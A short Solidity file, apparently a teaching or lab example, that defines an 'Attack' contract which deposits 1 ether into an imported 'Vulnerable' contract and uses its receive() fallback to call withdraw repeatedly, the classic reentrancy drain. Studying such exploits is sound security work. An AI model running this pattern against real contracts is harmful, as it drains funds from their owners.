//SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./vulnerable.sol";

contract Attack{
    Vulnerable public vulnerable; // creating object of Vulnerable and name it vulnerable
    constructor( address vulnerableAddress){
        vulnerable=Vulnerable(vulnerableAddress);//typecast in Vulnerable type
    } 
    function attack() external payable{
        vulnerable.deposite{value:1 ether}();
        vulnerable.withdraw();
    }
    receive() external payable{
        if(address(vulnerable).balance>=1 ether){
            vulnerable.withdraw();
        }
    }
}